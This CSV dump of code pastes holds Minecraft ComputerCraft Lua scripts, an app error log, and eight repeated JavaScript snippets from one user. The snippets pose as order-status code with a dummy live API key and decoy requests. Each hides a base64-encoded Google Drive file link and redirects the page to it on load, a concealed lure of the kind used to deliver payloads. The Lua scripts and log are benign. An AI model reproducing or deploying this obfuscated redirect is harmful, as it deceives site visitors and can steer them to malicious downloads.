id,title,username,language,date,content
vfTkHiu6,sticks,HappySunChild,Lua,Thursday 10th of April 2025 03:44:12 PM CDT,"---@param slot number
local function drop(slot)
	turtle.select(slot)
	turtle.dropUp(64)
end

---@param slot number
local function store(slot)
	turtle.select(slot)
	turtle.dropDown(64)
end

local function processPlanks()
	turtle.select(1)
	turtle.craft(64)

	for slot = 1, 4 do
		store(slot)
	end
end

local function processLogs()
	turtle.select(1)
	turtle.craft(64)

	turtle.select(2)
	turtle.transferTo(5)

	drop(3)
	drop(4)

	processPlanks()

	turtle.select(1)
	turtle.suckUp(64)
	turtle.select(5)
	turtle.suckUp(64)

	processPlanks()
end

local function main()
	print(""Processing logs"")

	while true do
		if not turtle.suck(64) then
			break
		end

		processLogs()
	end

	print(""no more logs"")
end

main()
"
9AF5dR08,Untitled,navrajkhunger,JavaScript,Thursday 10th of April 2025 03:30:23 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/38461/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JC89uBJw,Products.js,navrajkhunger,JavaScript,Thursday 10th of April 2025 03:14:38 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/33450/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
f9cfjJcQ,Order.js,navrajkhunger,JavaScript,Thursday 10th of April 2025 02:58:44 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/88731/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KdjdxhbQ,Market.js,navrajkhunger,JavaScript,Thursday 10th of April 2025 02:43:21 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/65174/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tMdpmPkT,Untitled,navrajkhunger,JavaScript,Thursday 10th of April 2025 02:27:57 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/69455/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iMHeaZWc,Products.js,navrajkhunger,JavaScript,Thursday 10th of April 2025 02:12:35 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/45000/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BDxtvn4M,Order.js,navrajkhunger,JavaScript,Thursday 10th of April 2025 01:57:13 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/74692/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
VcF1HvYQ,mina25.lua,RobinJut,Lua,Thursday 10th of April 2025 01:42:52 PM CDT,"-- Tamaño del área a minar
local width = 25
local length = 25
local height = 3

local progressFile = ""progress.txt""

-- Obtener progreso guardado
function loadProgress()
    if fs.exists(progressFile) then
        local file = fs.open(progressFile, ""r"")
        local data = textutils.unserialize(file.readAll())
        file.close()
        return data.x, data.z
    end
    return 1, 1
end

-- Guardar progreso actual
function saveProgress(x, z)
    local file = fs.open(progressFile, ""w"")
    file.write(textutils.serialize({x = x, z = z}))
    file.close()
end

-- Verificar y recargar combustible si es necesario
function checkFuel()
    while turtle.getFuelLevel() < 100 do
        for i = 1, 16 do
            turtle.select(i)
            if turtle.refuel(0) then
                turtle.refuel()
            end
        end

        if turtle.getFuelLevel() < 100 then
            print(""Pon carburante crack"")
            os.sleep(10)
        end
    end
end

-- Minar la columna 3x1 (frente, arriba y abajo)
function mineColumn()
    turtle.digDown()
    turtle.dig()
    turtle.digUp()
end

-- Mover hacia adelante asegurando cavado
function smartForward()
    while not turtle.forward() do
        turtle.dig()
    end
end

-- Volver al inicio de la fila siguiente (zigzag)
function turnToNextRow(z)
    if z % 2 == 1 then
        turtle.turnRight()
        smartForward()
        turtle.turnRight()
    else
        turtle.turnLeft()
        smartForward()
        turtle.turnLeft()
    end
end

-- Volver al inicio si se detuvo
function returnToStart(x, z)
    local facingEast = (z % 2 == 1)
    if not facingEast then
        turtle.turnLeft()
        turtle.turnLeft()
    end
    for i = 1, x - 1 do
        smartForward()
    end
    turtle.turnRight()
    for i = 1, z - 1 do
        smartForward()
    end
    turtle.turnLeft()
end

-- Main loop
function mineArea()
    local startX, startZ = loadProgress()
    returnToStart(startX, startZ)

    for z = startZ, length do
        for x = startX, width do
            checkFuel()
            mineColumn()
            if x < width then
                smartForward()
            end
            saveProgress(x, z)
        end

        if z < length then
            turnToNextRow(z)
        end

        startX = 1 -- Para nuevas filas, empezar desde el inicio
    end

    print(""Minería completada."")
    fs.delete(progressFile)
end

mineArea()
"
CrY5n5bB,2025-04-10T21:42:01.337,powerampache,PHP,Thursday 10th of April 2025 01:42:02 PM CDT,"1.00-72-BETA (74) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to ampache.nickroc.ru/85.21.144.182 (port 443) from /192.168.0.101 (port 47168) after 15000ms: isConnected failed: ETIMEDOUT (Connection timed out)"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)

authorize() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to ampache.nickroc.ru/85.21.144.182 (port 443) from /192.168.0.101 (port 47168) after 15000ms: isConnected failed: ETIMEDOUT (Connection timed out)\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to ampache.nickroc.ru/85.21.144.182 (port 443) from /192.168.0.101 (port 47168) after 15000ms: isConnected failed: ETIMEDOUT (Connection timed out)\"" }"",""stackTrace"":[],""suppressedExceptions"":[]}"
mxX1X0aR,Market.js,navrajkhunger,JavaScript,Thursday 10th of April 2025 01:41:51 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/13070/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xSrGpMMP,Idk,Berfuglol,Lua,Thursday 10th of April 2025 01:36:09 PM CDT,"-- Import necessary libraries
print(""Create Mod Big Cannons Ballistics Calculator Ultimate! Booting"")
math = require(""math"") -- DTB
 
-- Define the side of the computer where the bundled cable is connected
local bundledSide = ""bottom"" -- Adjust this as needed
 
-- Define color variables in a table for dynamic access
local chargeColors = {
    Charge1 = colors.lightBlue,
    Charge2 = colors.magenta,
    Charge3 = colors.orange,
    Charge4 = colors.white,
    Shell = colors.yellow,
}
local componentColors = {
    GunBreachGearShift = colors.lime,
    GunLoadingPole = colors.brown,
    GunPitchClutch = colors.cyan,
    GunYawClutch = colors.purple, 
    GunYawGearShift = colors.blue,
    GunBuild = colors.gray,
    GunAlarm = colors.black,
    GunFire = colors.green,
}
 
-- Initialize variables for the chat system and the UUIDs
local chatBox = peripheral.find(""chatBox"")
if not chatBox then
    error(""ChatBox peripheral not found."")
end
 
local authorizedUUIDs = {
    ""uuid1"",
    ""76364a85-1e9c-48df-975c-11eb045d5a51"",
    -- Add more authorized UUIDs here
}
 
-- Function to check if a UUID is authorized
local function isAuthorized(uuid)
    for _, authorizedUUID in ipairs(authorizedUUIDs) do
        if uuid == authorizedUUID then
            return true
        end
    end
    return false
end
 
-- Function to power on a specific color (activate a component)
local function PowerOn(componentColor)
    if not componentColor then
        print(""Error: Invalid color provided to PowerOn."")
        return
    end
    local currentOutput = redstone.getBundledOutput(bundledSide) or 0
    redstone.setBundledOutput(bundledSide, bit.bor(currentOutput, componentColor))
    print(""Powered on color: "" .. tostring(componentColor))
end
 
-- Function to power off a specific color (deactivate a component)
local function PowerOff(componentColor)
    if not componentColor then
        print(""Error: Invalid color provided to PowerOff."")
        return
    end
    local currentOutput = redstone.getBundledOutput(bundledSide) or 0
    redstone.setBundledOutput(bundledSide, bit.band(currentOutput, bit.bnot(componentColor)))
    print(""Powered off color: "" .. tostring(componentColor))
end
 
-- Function to reset all outputs
local function ResetOutputs()
    redstone.setBundledOutput(bundledSide, 0)
    print(""All outputs reset."")
end
 
-- Variables to store cannon data and pending fire mission
local Cannon = {}
local pendingFireSolution = nil
local RotationConstant = 2.6695 / 10
 
-- Function to send a denial message with red brackets
local function sendDeniedMessage(username)
    chatBox.sendMessageToPlayer(""You are not authorized to perform this action."", username, ""Denied"", ""[]"", ""&c"")
end
 
-- Function to send success message with green brackets
local function sendAcceptedMessage(username, message)
    chatBox.sendMessageToPlayer(message, username, ""Accepted"", ""[]"", ""&a"")
end
 
-- Function to send informational message with blue brackets
local function sendInfoMessage(username, message)
    chatBox.sendMessageToPlayer(message, username, ""Info"", ""[]"", ""&b"")
end
 
-- Function to save cannon data to a file
local function SaveCannonData()
    local file = fs.open(""cannon_data.txt"", ""w"")
    if file == nil then
        print(""Error opening file for writing."")
        return
    end
    file.writeLine(Cannon.x)
    file.writeLine(Cannon.y)
    file.writeLine(Cannon.z)
    file.writeLine(Cannon.yaw)
    file.writeLine(Cannon.maxCharges)
    file.close()
    print(""Cannon data saved."")
end
 
-- Function to load cannon data from a file
local function LoadCannonData()
    local file = fs.open(""cannon_data.txt"", ""r"")
    if file == nil then
        print(""No cannon data found."")
        return false -- Indicate that data was not loaded
    end
    Cannon.x = tonumber(file.readLine())
    Cannon.y = tonumber(file.readLine())
    Cannon.z = tonumber(file.readLine())
    Cannon.yaw = tonumber(file.readLine())
    Cannon.maxCharges = tonumber(file.readLine())
    file.close()
    print(""Cannon data loaded."")
    return true -- Indicate that data was loaded successfully
end
 
-- Function to prompt the user for cannon info via console
local function PromptForCannonInfo()
    print(""No cannon data found. Please enter cannon information."")
    print(""Input Barrel X: "")
    Cannon.x = tonumber(io.read())
    print(""Input Barrel Y: "")
    Cannon.y = tonumber(io.read())
    print(""Input Barrel Z: "")
    Cannon.z = tonumber(io.read())
    print(""Facing Yaw? (-180 to 180): "")
    Cannon.yaw = tonumber(io.read())
    print(""Max Charges?: "")
    Cannon.maxCharges = tonumber(io.read())
    SaveCannonData()
    print(""Cannon information saved."")
end
 
-- Function to set cannon information via chat command
local function SetCannonInfo(username, params)
    local x, y, z, yaw, maxCharges = params:match(""^(%-?%d+) (%-?%d+) (%-?%d+) (%-?%d+) (%d+)$"")
    if x and y and z and yaw and maxCharges then
        Cannon.x = tonumber(x)
        Cannon.y = tonumber(y)
        Cannon.z = tonumber(z)
        Cannon.yaw = tonumber(yaw)
        Cannon.maxCharges = tonumber(maxCharges)
        SaveCannonData()
        sendAcceptedMessage(username, ""Cannon information updated."")
    else
        sendInfoMessage(username, ""Invalid format. Use: <SetCannon> x y z yaw maxCharges"")
    end
end
 
-- Define the maximum acceptable distance error
local MaxDistanceError = 70 -- Adjust this value as needed
 
-- Function to calculate the pitch angle and charge count
local function CalculatePitch(maxCharges, Distance, TargetY)
    local overallBestCharge = nil
    local overallBestAngle = nil
    local overallBestDistanceError = math.huge
 
    for ChargeCount = maxCharges, 2, -1 do  -- Minimum charge count is now 2
        local bestAngle = nil
        local bestDistanceError = math.huge
 
        for angle = 10, 60, 0.1 do
            local height = Cannon.y + 0.01
            local muzzle_velocity = 40 * ChargeCount
            local rad_angle = math.rad(angle)
            local horizontal_velocity = muzzle_velocity * math.cos(rad_angle)
            local vertical_velocity = muzzle_velocity * math.sin(rad_angle)
            local time = 0
            local range = 0
 
            while height > TargetY or vertical_velocity > 0 do
                time = time + 0.05
                vertical_velocity = vertical_velocity - 23 * 0.05
                range = range + horizontal_velocity * 0.05
                horizontal_velocity = horizontal_velocity * 0.99
                height = height + vertical_velocity * 0.05
            end
 
            local distanceError = math.abs(range - Distance)
 
            if distanceError < bestDistanceError then
                bestDistanceError = distanceError
                bestAngle = angle
            end
        end
 
        -- Check if this is the best overall solution
        if bestDistanceError < overallBestDistanceError then
            overallBestDistanceError = bestDistanceError
            overallBestAngle = bestAngle
            overallBestCharge = ChargeCount
        end
 
        -- If the distance error is acceptable, return immediately
        if bestDistanceError <= MaxDistanceError then
            return ChargeCount, bestAngle, bestDistanceError
        end
    end
 
    -- After trying all charges, return nil if no acceptable solution found
    return nil, nil, nil
end
 
local function normalizeAngle(angle)
    angle = angle % 360
    if angle > 180 then
        angle = angle - 360
    end
    return angle
end
 
-- Function to handle the fire solution calculation
-- Function to handle the fire solution calculation
local function FireSolution(Target)
    -- Ensure Cannon data is loaded
    if not Cannon.x or not Cannon.y or not Cannon.z then
        return false, ""Cannon data not loaded. Please set cannon info using <SetCannon> command.""
    end
 
    -- Calculate Distance
    local Distance = math.sqrt((Target.x - Cannon.x)^2 + (Target.z - Cannon.z)^2)
 
    -- Call CalculatePitch()
    local ChargeCount, ClosestAngle, ClosestDistance = CalculatePitch(Cannon.maxCharges, Distance, Target.y)
 
    if ChargeCount then
        local rawYaw = math.deg(math.atan2(Target.z - Cannon.z, Target.x - Cannon.x)) - Cannon.yaw - 90
        local Yaw = normalizeAngle(rawYaw)
        local RotationTimeAngle = ClosestAngle * RotationConstant
        local YawTime = math.abs(Yaw * RotationConstant)
 
        local fireSolutionMessage = string.format(
            ""Fire Solution:\nAccuracy range: ±%.2f blocks\nCharge Count: %d\nYaw: %.2f degrees\nAngle: %.2f degrees\nType 'confirm' to proceed with firing."",
            ClosestDistance, ChargeCount, Yaw, ClosestAngle
        )
 
        -- Return success, message, and necessary data
        return true, fireSolutionMessage, {
            ChargeCount = ChargeCount,
            ClosestAngle = ClosestAngle,
            ClosestDistance = ClosestDistance,
            Yaw = Yaw,
            RotationTimeAngle = math.abs(ClosestAngle * RotationConstant),
            YawTime = math.abs(Yaw * RotationConstant),
            Target = Target,
            username = pendingFireSolution and pendingFireSolution.username or nil,
        }
    else
        return false, ""No Fire Solution possible within acceptable error margin for coordinates X="" .. Target.x .. "", Y="" .. Target.y .. "", Z="" .. Target.z
    end
end
 
 
-- Function to load the required number of charges
local function func_load_shells_mission(shells)
    if shells < 2 or shells > 4 then  -- Minimum shells is now 2
        print(""Error: Number of shells must be between 2 and 4."")
        return
    end
 
    -- Activate the required charges
    for i = 1, shells do
        local chargeName = ""Charge"" .. i
        local chargeColor = chargeColors[chargeName] -- Access from the table
        if chargeColor then
            PowerOn(chargeColor)
        else
            print(""Error: "" .. chargeName .. "" not defined."")
        end
    end
    PowerOn(chargeColors[""Shell""])
 
    -- Wait for 2 seconds
    sleep(2)
 
    -- Deactivate all charges
    for i = 1, shells do
        local chargeName = ""Charge"" .. i
        local chargeColor = chargeColors[chargeName]
        if chargeColor then
            PowerOff(chargeColor)
        else
            print(""Error: "" .. chargeName .. "" not defined."")
        end
    end
    PowerOff(chargeColors[""Shell""])
    sleep(13)
end
 
-- Function to execute the fire mission
local function ExecuteFireMission(fireMissionData)
    -- Extract data
    local ChargeCount = fireMissionData.ChargeCount
    local ClosestAngle = fireMissionData.ClosestAngle
    local Yaw = fireMissionData.Yaw
    local RotationTimeAngle = fireMissionData.RotationTimeAngle
    local YawTime = fireMissionData.YawTime
    local Target = fireMissionData.Target
    local username = fireMissionData.username
 
    -- Reset outputs
    ResetOutputs()
    PowerOff(componentColors.GunBuild)
 
    -- Load the required number of charges
    print(""Loading "" .. ChargeCount .. "" charges..."")
    sendAcceptedMessage(username, ""Starting Fire Mission with "" .. ChargeCount .. "" charges."")
    func_load_shells_mission(ChargeCount)
    sendAcceptedMessage(username, ChargeCount .. "" charges loaded."")
 
    -- Prepare for firing
    PowerOn(componentColors.GunBuild)
    sleep(0.5)
 
    -- Handle Yaw Direction
    if Yaw < 0 then
        PowerOn(componentColors.GunYawGearShift) -- Set direction for negative Yaw
    else
        PowerOff(componentColors.GunYawGearShift) -- Set direction for positive Yaw
    end
 
    -- Start moving both Pitch and Yaw
    print(""Aiming Cannon Pitch and Yaw simultaneously..."")
    local pitchActive = true
    local yawActive = true
    local elapsedTime = 0
    local timeStep = 0.1 -- Time increment for the loop
 
    -- Turn on both motors if movement is needed
    if RotationTimeAngle > 0 then
        PowerOn(componentColors.GunPitchClutch)
    else
        pitchActive = false -- No movement needed
    end
 
    if YawTime > 0 then
        PowerOn(componentColors.GunYawClutch)
    else
        yawActive = false -- No movement needed
    end
 
    -- Timer loop
    while pitchActive or yawActive do
        sleep(timeStep)
        elapsedTime = elapsedTime + timeStep
 
        -- Check Pitch
        if pitchActive and elapsedTime >= RotationTimeAngle then
            PowerOff(componentColors.GunPitchClutch)
            pitchActive = false
            print(""Pitch adjustment complete."")
        end
 
        -- Check Yaw
        if yawActive and elapsedTime >= YawTime then
            PowerOff(componentColors.GunYawClutch)
            yawActive = false
            print(""Yaw adjustment complete."")
        end
    end
 
    -- Fire the cannon
    print(""Firing Cannon..."")
    PowerOn(componentColors.GunAlarm)
    sleep(1)
    PowerOn(componentColors.GunFire)
    sleep(1)
    PowerOff(componentColors.GunFire)
    PowerOff(componentColors.GunAlarm)
    PowerOff(componentColors.GunBuild)
    print(""Fire mission complete."")
    sendAcceptedMessage(username, ""Fire Mission Complete."")
end
 
 
-- Attempt to load cannon data
local dataLoaded = LoadCannonData()
 
-- If data not loaded, prompt the user for cannon info
if not dataLoaded then
    PromptForCannonInfo()
end
 
-- Main event loop for chat handling
while true do
    local event, username, message, uuid, isHidden = os.pullEvent(""chat"")
    print(""Chat event from "" .. username .. "": "" .. message)
 
    -- Check if the message is a command
    if message == ""<GetMyUUID>"" then
        -- Respond with the user's UUID
        sendInfoMessage(username, ""Your UUID is: "" .. uuid)
    elseif message:match(""^<[%a]+>"") then
        -- This is a command, check authorization
        if isAuthorized(uuid) then
            local x, y, z = message:match(""^<FireSolution> (%-?%d+) (%-?%d+) (%-?%d+)"")
            if x and y and z then
                -- Handle FireSolution command
                local Target = { x = tonumber(x), y = tonumber(y), z = tonumber(z) }
                local success, fireSolutionMessage, fireMissionData = FireSolution(Target)
                if success then
                    -- Send the fire solution to the user via chat
                    sendInfoMessage(username, fireSolutionMessage)
                    -- Set pending fire solution
                    pendingFireSolution = {
                        username = username,
                        data = fireMissionData,
                    }
                else
                    -- Send failure message
                    sendInfoMessage(username, fireSolutionMessage)
                    pendingFireSolution = nil
                end
            else
                sendInfoMessage(username, ""Unknown command or invalid format."")
            end
        else
            -- Handle unauthorized access
            sendDeniedMessage(username)
        end
    elseif pendingFireSolution and username == pendingFireSolution.username then
        if message:lower() == ""confirm"" then
            -- Proceed with firing
            sendAcceptedMessage(username, ""Firing mission proceeding."")
            pendingFireSolution.data.username = username -- Pass the username to the execution function
            ExecuteFireMission(pendingFireSolution.data)
            pendingFireSolution = nil
        elseif message:lower() == ""cancel"" then
            sendInfoMessage(username, ""Fire mission canceled."")
            pendingFireSolution = nil
        else
            sendInfoMessage(username, ""Please type 'confirm' to proceed or 'cancel' to abort."")
        end
    else
        -- Normal chat message
        print(""Normal chat message: "" .. message)
    end
end"
